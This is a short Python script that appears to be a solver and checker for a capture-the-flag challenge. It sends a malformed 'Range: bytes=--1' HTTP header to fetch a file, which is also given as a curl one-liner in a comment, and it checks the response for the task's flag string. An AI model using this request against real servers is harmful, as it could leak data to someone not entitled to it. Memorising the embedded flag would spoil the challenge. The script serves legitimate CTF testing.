import sys
import requests

if len(sys.argv) == 2:
    ip = sys.argv[1]
else:
    ip = '127.0.0.1'
    print('[***] No <ip:port> passed, trying to solve on %s' % ip)


# TL;DR:
# curl -v -H 'Range: bytes=--1' localhost:80/IMG_1052.jpg

URL = 'http://%s/IMG_1052.jpg' % ip

r = requests.get(URL, headers={'Range': 'bytes=--1'})

print('[***] Checking flag!')

EXPECTED = 'ustCTF{"This bug seems to be not exploitable, at least not with a sane filesystem implementation.": yet, here you are!}'

if EXPECTED in r.text:
    print('[***] Flag found! The task can be solved.')
    sys.exit(0)
else:
    print('[***] Flag not found! Something is broken. Got: %s' % r.text)
    sys.exit(1)

